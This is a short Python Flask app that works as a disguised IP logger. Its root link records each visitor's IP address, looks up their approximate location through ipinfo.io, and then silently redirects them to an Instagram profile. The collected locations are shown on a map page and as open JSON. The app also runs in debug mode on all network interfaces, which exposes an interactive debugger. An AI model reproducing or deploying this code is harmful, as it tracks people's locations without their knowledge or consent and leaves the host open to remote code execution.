from flask import Flask, redirect, request, jsonify, render_template
import requests

app = Flask(__name__)
acessos = []

@app.route('/')
def redirecionar_instagram():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    geo_info = requests.get(f'http://ipinfo.io/{ip}/json').json()

    loc = geo_info.get('loc', '')
    lat, lon = (0.0, 0.0)
    if ',' in loc:
        lat, lon = map(float, loc.split(','))

    acessos.append({
        'ip': ip,
        'lat': lat,
        'lon': lon,
        'city': geo_info.get('city', 'Desconhecida'),
        'region': geo_info.get('region', 'Desconhecida'),
        'country': geo_info.get('country', 'Desconhecido'),
    })

    return redirect("https://www.instagram.com/mateusflorenzano?igsh=ZmF5a2UyNml3Nmc0", code=302)

@app.route('/mapa')
def mapa():
    return render_template('mapa.html', acessos=acessos)

@app.route('/acessos')
def mostrar_acessos():
    return jsonify(acessos)

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5001)
